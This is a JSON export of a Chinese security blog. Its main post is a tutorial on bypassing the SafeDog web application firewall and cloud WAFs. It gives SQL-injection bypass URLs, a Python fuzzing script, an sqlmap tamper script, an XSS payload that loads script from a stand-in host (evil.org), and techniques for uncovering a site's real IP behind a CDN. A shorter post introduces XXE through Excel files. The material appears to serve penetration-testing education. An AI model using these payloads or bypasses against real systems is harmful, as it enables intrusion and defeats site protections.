[{"title":"利用EXCEL进行XXE攻击","date":"2019-10-15T07:38:01.000Z","path":"2019-10-15-excel-xxe.html","content":"<p><img src=\"../img/hexo-2019-10-15-16-59-42.png\" alt></p>\n<a id=\"more\"></a>\n\n<h1 id=\"0x00-前言\"><a href=\"#0x00-前言\" class=\"headerlink\" title=\"0x00 前言\"></a>0x00 前言</h1><p>XML外部实体注入攻击简称XXE，我们可以基于此来对服务器信息进行探测和获取。<br><del>libxml 2.9.0以后，默认不解析外部实体(与php版本无关)，导致XXE漏洞逐渐消亡，但这对于旧系统来说依然是比较常见的。</del><br>对于基于HTTP API发起XXE攻击是网上较为常见的攻击方式，这里来谈一谈利用EXCEL进行XXE攻击。</p>\n<h1 id=\"0x01-为什么可以这么做\"><a href=\"#0x01-为什么可以这么做\" class=\"headerlink\" title=\"0x01 为什么可以这么做\"></a>0x01 为什么可以这么做</h1><p>Microsoft Office从2007版本引入了新的开放的XML文件格式，新的XML文件格式基于压缩的ZIP文件格式规范，由许多部分组成。我们可以将其解压缩到特定的文件夹中来查看其包含的文件夹和文件，可以发现其中多数是描述工作簿数据、元数据、文档信息的XML文件。<br><img src=\"../img/hexo-2019-10-15-16-04-18.png\" alt></p>\n<h1 id=\"0x02-背景信息\"><a href=\"#0x02-背景信息\" class=\"headerlink\" title=\"0x02 背景信息\"></a>0x02 背景信息</h1><p>下面介绍相关的背景信息</p>\n<h2 id=\"CVE-2014-3529\"><a href=\"#CVE-2014-3529\" class=\"headerlink\" title=\"CVE-2014-3529\"></a>CVE-2014-3529</h2><p>Apache POI 是 Apache 软件基金会的开源项目，POI 提供 API 接口给 Java 程序对 Microsoft office 格式文档读写能力。Apache POI 3.10-FINAL及以前版本被发现允许远程攻击者通过注入XML外部实体访问外部实体资源或者读取任意文件。<br><strong>影响范围</strong><br>poi-ooxml-3.10-FINAL.jar及以下版本<br><strong>漏洞利用点</strong><br>[Content-Types].xml</p>\n","excerpt":"","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"http://ll-mf.github.io/tags/Web/"},{"name":"XXE","slug":"XXE","permalink":"http://ll-mf.github.io/tags/XXE/"}]},{"title":"PHP序列化和反序列化","date":"2019-10-14T01:22:33.000Z","path":"2019-10-14-PHP serialization-and-deserialization.html","content":"","excerpt":"","categories":[],"tags":[{"name":"序列化和反序列化","slug":"序列化和反序列化","permalink":"http://ll-mf.github.io/tags/序列化和反序列化/"},{"name":"PHP","slug":"PHP","permalink":"http://ll-mf.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://ll-mf.github.io/tags/Web/"}]},{"title":"对抗WAF继续渗透","date":"2019-10-12T02:26:30.000Z","path":"2019-10-12-Bypass.html","content":"<p><img src=\"../img/hexo-2019-10-12-17-29-50.png\" alt>  </p>\n<a id=\"more\"></a>\n<p>在渗透测试的过程中，经常会遇到各种各样的WAF，WAF会将用户提交的符合规则库中的恶意数据给阻断，这对渗透测试带来了挑战。要想对抗WAF来继续对目标进行渗透，就必须先了解WAF的类型和原理才能于其规则进行对抗。<br>WAF大致分为三类：  </p>\n<blockquote>\n<p><strong>硬件Web防火墙</strong>：就是常说的硬WAF，通常的安装方式是将Waf串行部署在Web服务器前端，用于检测、阻断异常流量。</p>\n</blockquote>\n<blockquote>\n<p><strong>Web防护软件</strong>：就是常说的软WAF，则是安装在需要防护的服务器上，实现方式通常是WAF监听端口或以Web容器扩展方式进行请求检测和阻断。</p>\n</blockquote>\n<blockquote>\n<p><strong>云WAF</strong>：是近年来随着云计算的推动衍生出来的新产品，云WAF，也称WEB应用防火墙的云模式，这种模式让用户不需要在自己的网络中安装软件程序或部署硬件设备，就可以对网站实施安全防护，它的主要实现方式是利用DNS技术，通过移交域名解析权来实现安全防护。用户的请求首先发送到云端节点进行检测，如存在异常请求则进行拦截否则将请求转发至真实服务器。</p>\n</blockquote>\n<p>由于硬件WAF购买价格昂贵，受众数量较少，因此通常遇到的都是部署在服务器上的软WAF和部署在云服务器上的云WAF，因此这里只讨论存在软WAF和云WAF的情况。</p>\n<h1 id=\"0x01-对抗软WAF\"><a href=\"#0x01-对抗软WAF\" class=\"headerlink\" title=\"0x01 对抗软WAF\"></a>0x01 对抗软WAF</h1><p>软WAF比较有代表性的就是安全狗了，因此这里以安全狗为例，其余软WAF均可以使用大致相同的思路——<strong>Fuzz</strong> 来进行绕过。</p>\n<h2 id=\"绕过安全狗扫描目录\"><a href=\"#绕过安全狗扫描目录\" class=\"headerlink\" title=\"绕过安全狗扫描目录\"></a>绕过安全狗扫描目录</h2><p>在服务器端未开启CC防御时，可采用自定义User-Agent来对站点进行目录扫描，这里使用<strong>DirBuster</strong>来将User-Agent设置成百度爬虫的User-Agent头<br><code>User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</code>  </p>\n<img src=\"../img/hexo-2019-10-12-15-30-10.png\" height=\"330\" width=\"495\">  \n\n<p>下面为<strong>DirBuster</strong>的使用方法<br><img src=\"../img/hexo-2019-10-12-15-30-25.png\" height=\"330\" width=\"495\">  </p>\n<h2 id=\"绕过安全狗继续注入\"><a href=\"#绕过安全狗继续注入\" class=\"headerlink\" title=\"绕过安全狗继续注入\"></a>绕过安全狗继续注入</h2><p>安全狗版本<br>时间    2019/8/1<br>安全狗版本    V4.0<br>安全狗规则版本    2018-11-30    </p>\n<h3 id=\"1-SQL注释符-绕过\"><a href=\"#1-SQL注释符-绕过\" class=\"headerlink\" title=\"1.SQL注释符/**/绕过\"></a>1.SQL注释符/**/绕过</h3><p>在安全狗规则中，默认会对添加了SQL注释符的请求进行忽略，因此可以构造形如下面的代码来绕过安全狗：<br><code>192.168.1.3/anquangou.php?a=/*&amp;id=2%20and%201=2&amp;*/</code><br>1=1时返回id=2的用户信息，并且未被拦截<br><img src=\"../img/hexo-2019-10-12-15-53-35.png\"><br>1=2时无返回值<br><img src=\"../img/hexo-2019-10-12-15-53-48.png\"><br>查询版本信息<br><img src=\"../img/hexo-2019-10-12-15-59-09.png\" alt>  </p>\n<h3 id=\"2-FUZZ绕过并配合sqlmap实现自动化绕过注入\"><a href=\"#2-FUZZ绕过并配合sqlmap实现自动化绕过注入\" class=\"headerlink\" title=\"2.FUZZ绕过并配合sqlmap实现自动化绕过注入\"></a>2.FUZZ绕过并配合sqlmap实现自动化绕过注入</h3><p>Fuzz脚本如下：</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">            <span class=\"string\">'User-Agent'</span>: <span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3)AppleWebKit / 535.20(KHTML, like Gecko) Chrome / 19.0.1036.7Safari / 535.20'</span>,</span><br><span class=\"line\">            <span class=\"string\">'Referer'</span>: <span class=\"string\">'http://www.baidu.com'</span>,</span><br><span class=\"line\">                   <span class=\"string\">'Cookie'</span>: <span class=\"string\">'whoami=print(\"\")'</span>,</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">fuzz_zs = [<span class=\"string\">'/*'</span>, <span class=\"string\">'*/'</span>, <span class=\"string\">'/*!'</span>, <span class=\"string\">'*'</span>, <span class=\"string\">'='</span>, <span class=\"string\">'`'</span>, <span class=\"string\">'!'</span>, <span class=\"string\">'@'</span>, <span class=\"string\">'%'</span>, <span class=\"string\">'.'</span>, <span class=\"string\">'-'</span>, <span class=\"string\">'+'</span>, <span class=\"string\">'|'</span>, <span class=\"string\">'%00'</span>]</span><br><span class=\"line\">fuzz_sz = [<span class=\"string\">''</span>, <span class=\"string\">' '</span>]</span><br><span class=\"line\">fuzz_ch = [<span class=\"string\">\"%0a\"</span>, <span class=\"string\">\"%0b\"</span>, <span class=\"string\">\"%0c\"</span>, <span class=\"string\">\"%0d\"</span>, <span class=\"string\">\"%0e\"</span>, <span class=\"string\">\"%0f\"</span>, <span class=\"string\">\"%0g\"</span>, <span class=\"string\">\"%0h\"</span>, <span class=\"string\">\"%0i\"</span>, <span class=\"string\">\"%0j\"</span>]</span><br><span class=\"line\">Fuzz = fuzz_ch + fuzz_sz + fuzz_zs</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> a <span class=\"keyword\">in</span> Fuzz:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> Fuzz:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> Fuzz:</span><br><span class=\"line\">                <span class=\"keyword\">for</span> d <span class=\"keyword\">in</span> Fuzz:</span><br><span class=\"line\">                    exp = url + <span class=\"string\">\"%20union\"</span> + <span class=\"string\">\"--%20asdasd\"</span>+ a + b + c + d + <span class=\"string\">\"select\"</span> + <span class=\"string\">\"%201,2,3%20--+\"</span></span><br><span class=\"line\">                    <span class=\"comment\"># print exp</span></span><br><span class=\"line\">                    response = requests.get(url=exp, headers=headers).content</span><br><span class=\"line\">                    <span class=\"comment\">#rint(response)</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> <span class=\"string\">\"safedog\"</span> <span class=\"keyword\">in</span> str(response) <span class=\"keyword\">or</span> <span class=\"string\">\"error\"</span> <span class=\"keyword\">in</span> str(response):</span><br><span class=\"line\">                        <span class=\"keyword\">pass</span></span><br><span class=\"line\">                    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">print</span> (exp)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    url = <span class=\"string\">\"http://192.168.1.3:8080/anquangou.php?id=-1\"</span></span><br><span class=\"line\">    run(url)</span><br></pre></td></tr></table></figure>\n\n<p>Fuzz出来的语句为(其实远远不止，只是为了举例)<br><code>fuzz语句 http://192.168.1.3:8080/anquangou.php?id=-1%20union--%20asdasd%0A%0Aselect%201,666,3%20--+</code><br>其他绕过位置放入bypass代码也是一样<br>比如<code>http://192.168.1.3:8080/anquangou.php?id=-1%20union--%20asdasd%0A%0Aselect%201,database(),3%20--+</code>在查询database()时会被拦截,此时将干扰符插入database和()其中，就可以做到bypass  </p>\n<p>直接查询database()，被拦截<br><img src=\"../img/hexo-2019-10-12-16-24-56.png\" alt><br>插入Fuzz出来的干扰符后<br><img src=\"../img/hexo-2019-10-12-16-25-43.png\" alt>  </p>\n<p>最后可配合sqlmap做成自动化绕过tamper脚本</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\">#By LLMF  </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">Copyright (c) 2006-2013 sqlmap developers (http://sqlmap.org/)</span></span><br><span class=\"line\"><span class=\"string\">See the file 'doc/COPYING' for copying permission</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> lib.core.enums <span class=\"keyword\">import</span> PRIORITY</span><br><span class=\"line\"><span class=\"keyword\">from</span> lib.core.common <span class=\"keyword\">import</span> singleTimeWarnMessage</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dependencies</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\">__priority__ = PRIORITY.LOW</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">tamper</span><span class=\"params\">(payload, **kwargs)</span>:</span></span><br><span class=\"line\">    <span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">    Replaces space character (' ') with plus ('+')</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Notes:</span></span><br><span class=\"line\"><span class=\"string\">        * Is this any useful? The plus get's url-encoded by sqlmap engine</span></span><br><span class=\"line\"><span class=\"string\">          invalidating the query afterwards</span></span><br><span class=\"line\"><span class=\"string\">        * This tamper script works against all databases</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    &gt;&gt;&gt; tamper('SELECT id FROM users')</span></span><br><span class=\"line\"><span class=\"string\">    'SELECT+id+FROM+users'</span></span><br><span class=\"line\"><span class=\"string\">    \"\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">    retVal = payload</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> payload:</span><br><span class=\"line\">        retVal = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        quote, doublequote, firstspace = <span class=\"literal\">False</span>, <span class=\"literal\">False</span>, <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> xrange(len(payload)):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> firstspace:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> payload[i].isspace():</span><br><span class=\"line\">                    firstspace = <span class=\"literal\">True</span></span><br><span class=\"line\">                    retVal += <span class=\"string\">\"-- asdasd%0A%0A\"</span></span><br><span class=\"line\">                    <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">elif</span> payload[i] == <span class=\"string\">'\\''</span>:</span><br><span class=\"line\">                quote = <span class=\"keyword\">not</span> quote</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">elif</span> payload[i] == <span class=\"string\">'\"'</span>:</span><br><span class=\"line\">                doublequote = <span class=\"keyword\">not</span> doublequote</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">elif</span> payload[i] == <span class=\"string\">\" \"</span> <span class=\"keyword\">and</span> <span class=\"keyword\">not</span> doublequote <span class=\"keyword\">and</span> <span class=\"keyword\">not</span> quote:</span><br><span class=\"line\">                retVal += <span class=\"string\">\"-- asdasd%0A%0A\"</span></span><br><span class=\"line\">                <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">            retVal += payload[i]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> retVal</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-分块传输绕过\"><a href=\"#3-分块传输绕过\" class=\"headerlink\" title=\"3.分块传输绕过\"></a>3.分块传输绕过</h3><p>相关原理知识点在安全客上<a href=\"https://www.anquanke.com/post/id/169738，这里仅做记录\" target=\"_blank\" rel=\"noopener\">https://www.anquanke.com/post/id/169738，这里仅做记录</a><br><img src=\"../img/hexo-2019-10-12-16-29-23.png\" alt>  </p>\n<h3 id=\"4-静态文件绕过\"><a href=\"#4-静态文件绕过\" class=\"headerlink\" title=\"4.静态文件绕过\"></a>4.静态文件绕过</h3><p>通过静态文件后缀可发内置的白名单，直接被安全狗放行  </p>\n<p>IIS版安全狗<br>///.js?  js可以换成rm/wm/png/jpg等静态文件后缀<br>测试发现，只要url包含 ///.js? 就会触发内置的白名单，直接被iis版安全狗放行。<br>对于安全狗iis版，php,aspx,asp均能用这种方式过狗。<br><code>http://192.168.29.131:8980/sql.php?id=1%20and%201%3d1&amp;xss=&lt;script&gt;alert(/xss/)&lt;/script&gt;&amp;safe=///.js?</code>(既有sql注入，又有xss攻击，放行)<br><code>http://192.168.29.131:8980/sql.php?id=1%20and%201%3d1&amp;xss=&lt;SCRIPT%20SRC=http://evil.org/xss.js?&lt;/script&gt;</code>(很evil，也放行)  </p>\n<p>apache版安全狗<br><code>http://.../sql.php/1.js?id=1</code><br><code>http://.../sql.aspx/1.js?id=1</code><br><img src=\"../img/hexo-2019-10-12-16-31-41.png\" alt>  </p>\n<h3 id=\"5-具体bypass字符串替换\"><a href=\"#5-具体bypass字符串替换\" class=\"headerlink\" title=\"5.具体bypass字符串替换\"></a>5.具体bypass字符串替换</h3><p>可bypass替换表格  </p>\n<table>\n    <tr>\n        <th>拦截字符</th>\n        <th>Bypass字符</th>\n    </tr>\n    <tr>\n        <th>And</th>\n        <th>&&(Encode URL)%26%26</th>\n    </tr>\n    <tr>\n        <th>1=1</th>\n        <th>true</th>\n    </tr>\n    <tr>\n        <th>1=2</th>\n        <th>false</th>\n    </tr>\n    <tr>\n        <th>均可判断页面变化</th>\n        <th>Xor False/Xor True</th>\n    </tr>\n</table>\n\n<hr>\n<p><strong>2019/10/14更新</strong> </p>\n<h1 id=\"0x02-对抗云WAF\"><a href=\"#0x02-对抗云WAF\" class=\"headerlink\" title=\"0x02 对抗云WAF\"></a>0x02 对抗云WAF</h1><p>云WAF的工作原理是利用DNS技术，通过移交域名解析权来实现安全防护。用户的请求首先发送到云端节点进行检测，如存在异常请求则进行拦截否则将请求转发至真实服务器。类似的，CDN也有相应的功能。比较常遇到的有：创宇加速乐、云盾、百度云加速等。</p>\n<p>因此，我们主要努力的方向是找到服务器的真实IP，从而对云WAF和CDN来进行绕过。  </p>\n<h2 id=\"验证是否存在CND\"><a href=\"#验证是否存在CND\" class=\"headerlink\" title=\"验证是否存在CND\"></a>验证是否存在CND</h2><p><strong>方法1：</strong><br>使用多地ping服务，查看解析的IP地址是否为同一个IP地址，如果不唯一很大概率是使用了CDN，也可以查询多个解析的IP地址的归属来进行判断。<br>多地ping的网站有：<br><a href=\"http://ping.chinaz.com/\" target=\"_blank\" rel=\"noopener\">http://ping.chinaz.com/</a><br><a href=\"https://ping.aizhan.com/\" target=\"_blank\" rel=\"noopener\">https://ping.aizhan.com/</a></p>\n<p><strong>方法2:</strong><br>使用nslookup进行检测，原理和上面的方法是一样的，如果返回域名解析对应多个IP地址多半是使用了CDN。有CDN的示例：<br><img src=\"../img/hexo-2019-10-14-11-11-19.png\" alt></p>\n<h2 id=\"绕过CDN查找真实IP\"><a href=\"#绕过CDN查找真实IP\" class=\"headerlink\" title=\"绕过CDN查找真实IP\"></a>绕过CDN查找真实IP</h2><h3 id=\"1-查询历史DNS记录\"><a href=\"#1-查询历史DNS记录\" class=\"headerlink\" title=\"1.查询历史DNS记录\"></a>1.查询历史DNS记录</h3><p>查询域名历史DNS解析记录，可能会存在使用CDN以前的记录，相关查询网站有：<br>国内：<br><a href=\"https://site.ip138.com\" target=\"_blank\" rel=\"noopener\">https://site.ip138.com</a>  ip138<br><a href=\"https://x.threatbook.cn\" target=\"_blank\" rel=\"noopener\">https://x.threatbook.cn</a> 微步在线<br><a href=\"https://tools.ipip.net/cdn.php\" target=\"_blank\" rel=\"noopener\">https://tools.ipip.net/cdn.php</a>  CDN查询<br>国外：<br><a href=\"https://securitytrails.com/\" target=\"_blank\" rel=\"noopener\">https://securitytrails.com/</a><br>这里还会提供子域名等信息<br><img src=\"../img/hexo-2019-10-14-15-15-17.png\" alt></p>\n<p>为避免误差，可以将所有历史IP采集下来挨个与当前域名匹配。<br><strong>优点：</strong>较为简单并且可以通用<br><strong>缺点：</strong>若是目标站点解析变更极少，CDN部署得早等情况下则适用性低  </p>\n<h3 id=\"2-SMTP发送邮件泄露原站IP\"><a href=\"#2-SMTP发送邮件泄露原站IP\" class=\"headerlink\" title=\"2.SMTP发送邮件泄露原站IP\"></a>2.SMTP发送邮件泄露原站IP</h3><p>最直接最有效的方式。大部分公用SMTP服务在发信时邮件头会带上发件者IP，这样直接导致CDN失去原本的防护意义。<br>这里用某招聘网站作为例子，在忘记密码处，填写自己的邮箱，在收件箱处查看信头  </p>\n<p><img src=\"../img/hexo-2019-10-14-15-55-42.png\" alt>  </p>\n<p>箭头处就是发件人IP地址。获取到该地址后可以修改hosts将域名和该IP地址绑定来绕过CDN，或者通过IP:端口的方式来访问。  </p>\n<h3 id=\"3-查询子域名\"><a href=\"#3-查询子域名\" class=\"headerlink\" title=\"3.查询子域名\"></a>3.查询子域名</h3><p>一些情况下，站点管理员只把主业务部署了CDN，而在同一个服务器的子域名却没有部署CDN，通过查询或者爆破子域名，将子域名IP和目标域名相匹配，直到访问成功。</p>\n<p>这里使用的是<a href=\"https://github.com/lijiejie/subDomainsBrute\" target=\"_blank\" rel=\"noopener\">https://github.com/lijiejie/subDomainsBrute</a> 的子域名爆破脚本。</p>\n<h3 id=\"4-网站漏洞利用\"><a href=\"#4-网站漏洞利用\" class=\"headerlink\" title=\"4.网站漏洞利用\"></a>4.网站漏洞利用</h3><p>1) 当目标站点存在信息泄露，例如：phpinfo页面等等。<br>2) SSRF，通过SSRF，使得服务器主动向接受平台发起连接，从而获得服务器真实IP。</p>\n<p>这些方法获取到的真实IP基本是百分百准确的。</p>\n<h3 id=\"5-利用国外主机解析域名\"><a href=\"#5-利用国外主机解析域名\" class=\"headerlink\" title=\"5.利用国外主机解析域名\"></a>5.利用国外主机解析域名</h3><p>一些CDN厂商可能只对国内发起的访问做了CDN，而针对国外的线路则没有，因此如果使用国外主机对域名发起解析可能就可以的到服务器的真实IP。</p>\n<p><strong>获取到网站的真实IP后，可直接通过IP:端口的方式进行访问，但有时站点时不允许直接通过IP发起访问的，这时候就需要修改hosts文件，将寻找到的真实IP和域名绑定在一起，此时访问目标域名就会解析到绑定的真实IP上，从而绕过CDN和云WAF的防护。</strong></p>\n","excerpt":"","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"http://ll-mf.github.io/tags/Web/"},{"name":"Bypass","slug":"Bypass","permalink":"http://ll-mf.github.io/tags/Bypass/"}]},{"title":"初见","date":"2019-10-10T02:26:30.000Z","path":"2019-10-10-hello-world.html","content":"<p><img src=\"../img/hexo-2019-10-12-17-14-39.png\" alt></p>\n<a id=\"more\"></a>\n","excerpt":"","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"http://ll-mf.github.io/tags/随笔/"}]}]